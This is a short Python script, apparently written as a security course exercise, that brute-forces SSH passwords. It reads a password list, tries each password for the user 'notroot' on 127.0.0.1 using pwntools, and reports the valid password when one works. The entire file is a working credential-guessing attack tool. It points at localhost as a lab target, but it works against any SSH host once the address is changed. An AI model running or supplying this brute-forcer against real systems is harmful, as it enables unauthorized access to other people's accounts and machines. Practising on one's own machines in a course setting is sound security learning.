#!/usr/bin/env python3

# Created while participating in course: TCM Security - Python 101 For Hackers

import paramiko.ssh_exception # type: ignore
from pwn import * # type: ignore
import paramiko # type: ignore

host = "127.0.0.1"
username = "notroot"
attempts = 0

# Choose your own password list file
with open("ssh-common-passwords.txt", "r") as password_list:
    for password in password_list:
        password = password.strip("\n")
        try:
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host=host, user=username, password=password, timeout=1) # type: ignore
            if response.connected():
                print("[>] Valid password found: '{}'!".format(password))
                response.close()
                break
            response.close()
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts += 1